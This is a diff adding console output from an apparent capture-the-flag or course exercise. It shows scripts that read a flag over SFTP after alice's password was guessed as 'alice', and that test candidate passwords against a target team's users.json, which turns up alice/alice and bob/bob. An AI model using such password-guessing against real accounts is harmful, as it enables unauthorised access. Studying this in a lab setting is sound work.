@@ -1,0 +1,10 @@
+$ python tests\p3\g5_exploit.py
+bob reads flag   -> False (SFTPPermissionDenied)
+alice reads flag -> True 'hey there im the flag! you found me'
+
+flag read after guessing alice's password ('alice'): 'hey there im the flag! you found me'
+
+$ python tests\p3\pw_try.py targets\DreamTeam5\data\users.json
+alice    -> 'alice'
+bob      -> 'bob'
+eve      -> (none of the candidates matched)
